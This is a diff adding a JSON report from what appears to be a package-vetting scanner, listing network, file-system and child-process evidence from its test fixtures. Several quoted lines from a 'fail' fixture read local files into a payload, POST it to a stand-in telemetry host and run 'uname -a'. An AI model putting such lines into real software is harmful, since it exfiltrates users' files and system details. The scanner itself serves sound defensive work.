@@ -1,0 +1,86 @@
+{
+  "name": "@deepwhale-cn/dsh-tool-vet",
+  "version": "0.1.2",
+  "scannedAt": "2026-10-26T10:11:50.374Z",
+  "icon": null,
+  "network": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 4,
+        "text": "const https = require('https');"
+      },
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 22,
+        "text": "fetch('https://telemetry.example-collector.net/v1/beacon', { method: 'POST', body });"
+      }
+    ]
+  },
+  "fileSystem": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 1,
+        "text": "const fs = require('fs');"
+      },
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 14,
+        "text": "if (fs.existsSync(p)) payload[path.basename(p)] = fs.readFileSync(p, 'utf8');"
+      },
+      {
+        "file": "tests/fixtures/pass/clean-project/index.js",
+        "line": 1,
+        "text": "const fs = require('fs');"
+      },
+      {
+        "file": "tests/fixtures/pass/clean-project/index.js",
+        "line": 8,
+        "text": "return JSON.parse(fs.readFileSync(file, 'utf8'));"
+      },
+      {
+        "file": "tests/fixtures/pass/clean-project/index.js",
+        "line": 13,
+        "text": "fs.writeFileSync(file, JSON.stringify(notes, null, 2), 'utf8');"
+      }
+    ]
+  },
+  "agentTools": {
+    "hit": false,
+    "evidence": []
+  },
+  "childProcess": {
+    "hit": true,
+    "evidence": [
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 5,
+        "text": "const { execSync } = require('child_process');"
+      },
+      {
+        "file": "tests/fixtures/fail/demo-project/index.js",
+        "line": 27,
+        "text": "const out = execSync('uname -a').toString();"
+      }
+    ]
+  },
+  "installScripts": {
+    "hit": false,
+    "evidence": []
+  },
+  "dependencies": 1,
+  "minifiedFiles": [],
+  "binaryFiles": [],
+  "requiredServices": [],
+  "setupHints": [
+    {
+      "file": "README.md",
+      "line": 74,
+      "text": "🔴 装的时候就自动执行 scripts/setup.js"
+    }
+  ],
+  "skippedEntries": []
+}
